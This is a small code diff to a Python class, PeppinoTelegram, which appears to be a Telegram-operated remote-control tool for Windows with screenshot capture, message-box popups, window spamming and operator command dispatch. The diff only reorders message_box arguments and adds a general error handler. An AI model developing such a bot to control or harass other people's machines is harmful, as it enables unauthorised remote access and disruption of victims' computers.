@@ -608,7 +608,7 @@ class PeppinoTelegram:
         except Exception as e:
             return self.bsend(f"Error while getting screenshot\n{e}")
 
-    def message_box(self, title: str, text: str, style=0x1000) -> None:
+    def message_box(self, text: str, title: str="Warning", style=0x1000) -> None:
         return ctypes.windll.user32.MessageBoxW(0, text, title, style)
 
     def spam_windows(self, n: int, text: str) -> None:
@@ -1008,6 +1008,8 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
                 new_thread.start()
             except TypeError as e:
                 self.bsend(f"Invalid args for function {command}\n{e}")
+            except Exception as e:
+                self.bsend(f"Unhandler error for function {command}\n{e}")
         else:
             self.bsend(f"Invalid command {command}")
     
